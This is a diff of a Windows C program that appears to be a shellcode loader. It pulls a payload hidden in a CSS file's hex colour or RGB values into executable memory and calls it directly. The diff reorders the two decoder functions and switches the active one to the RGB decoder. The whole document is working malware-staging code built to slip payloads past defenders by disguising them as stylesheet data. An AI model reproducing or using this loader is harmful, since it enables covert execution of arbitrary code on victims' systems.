@@ -1,6 +1,37 @@
 #include <Windows.h>
 #include <stdio.h>
 
+BOOL DecodeCssHex(IN BYTE * cssFile, IN SIZE_T cssFileSize, OUT BYTE ** decPayload, OUT SIZE_T * decPayloadSize) {
+    BYTE * payload = NULL;
+    SIZE_T payloadSize = 0;
+
+    payload = (BYTE *) VirtualAlloc(NULL, (cssFileSize/2), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!payload) {
+        printf("[!] Error calling VirtualAlloc[2]: %d\n", GetLastError());
+        return FALSE;
+    }
+
+    while(*cssFile++) {
+        if (strncmp(cssFile, "#", 1) == 0) {
+            BYTE * hexValueStart = cssFile + 1;
+            
+            for (int i = 0; i < 3; i++) {
+                BYTE hexPair[3];
+                hexPair[0] = hexValueStart[i * 2];
+                hexPair[1] = hexValueStart[i * 2 + 1];
+                hexPair[2] = '\0';
+            
+                payload[payloadSize++] = (BYTE) strtol(hexPair, NULL, 16);
+            }
+        }
+    }
+
+    *decPayload = payload;
+    *decPayloadSize = payloadSize;
+
+    return TRUE;
+}
+
 BOOL DecodeCssRbg(IN BYTE * cssFile, IN SIZE_T cssFileSize, OUT BYTE ** decPayload, OUT SIZE_T * decPayloadSize) {
     BYTE * payload = NULL;
     SIZE_T payloadSize = 0;
@@ -45,37 +76,6 @@ BOOL DecodeCssRbg(IN BYTE * cssFile, IN SIZE_T cssFileSize, OUT BYTE ** decPaylo
     return TRUE;
 }
 
-BOOL DecodeCssHex(IN BYTE * cssFile, IN SIZE_T cssFileSize, OUT BYTE ** decPayload, OUT SIZE_T * decPayloadSize) {
-    BYTE * payload = NULL;
-    SIZE_T payloadSize = 0;
-
-    payload = (BYTE *) VirtualAlloc(NULL, (cssFileSize/2), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    if (!payload) {
-        printf("[!] Error calling VirtualAlloc[2]: %d\n", GetLastError());
-        return FALSE;
-    }
-
-    while(*cssFile++) {
-        if (strncmp(cssFile, "#", 1) == 0) {
-            BYTE * hexValueStart = cssFile + 1;
-            
-            for (int i = 0; i < 3; i++) {
-                BYTE hexPair[3];
-                hexPair[0] = hexValueStart[i * 2];
-                hexPair[1] = hexValueStart[i * 2 + 1];
-                hexPair[2] = '\0';
-            
-                payload[payloadSize++] = (BYTE) strtol(hexPair, NULL, 16);
-            }
-        }
-    }
-
-    *decPayload = payload;
-    *decPayloadSize = payloadSize;
-
-    return TRUE;
-}
-
 int main(void) {
     HANDLE hFile = NULL;
     BYTE * decodedPayload = NULL;
@@ -108,17 +108,18 @@ int main(void) {
     }
 
 
-    if (!DecodeCssHex(encodedPayloadBuf, fileSize.LowPart, &decodedPayload, &decodedPayloadSize)) {
-        printf("[!] Error decoding CSS payload\n");
-        goto _EndOfFunc;
-    }
-
-
-    // Uncomment and comment above to use Hex version
-    // if (!DecodeCssRbg(encodedPayloadBuf, fileSize.LowPart, &decodedPayload, &decodedPayloadSize)) {
+    // Uncomment and comment above to use Hex version    
+    // if (!DecodeCssHex(encodedPayloadBuf, fileSize.LowPart, &decodedPayload, &decodedPayloadSize)) {
     //     printf("[!] Error decoding CSS payload\n");
     //     goto _EndOfFunc;
     // }
+
+
+    // Uncomment and comment above to use Hex version
+    if (!DecodeCssRbg(encodedPayloadBuf, fileSize.LowPart, &decodedPayload, &decodedPayloadSize)) {
+        printf("[!] Error decoding CSS payload\n");
+        goto _EndOfFunc;
+    }
 
     (*(VOID(*)()) decodedPayload)();
 
